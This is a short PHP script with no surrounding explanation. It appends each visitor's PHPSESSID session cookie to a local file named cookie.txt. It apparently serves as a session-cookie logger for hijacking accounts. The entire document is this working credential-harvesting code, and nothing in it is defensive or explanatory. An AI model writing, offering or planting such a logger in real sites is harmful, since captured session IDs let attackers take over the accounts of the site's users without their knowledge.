<?php

$fp = fopen("cookie.txt", "a");

fwrite($fp, $_COOKIE["PHPSESSID"]."\n");

fclose($fp);

?>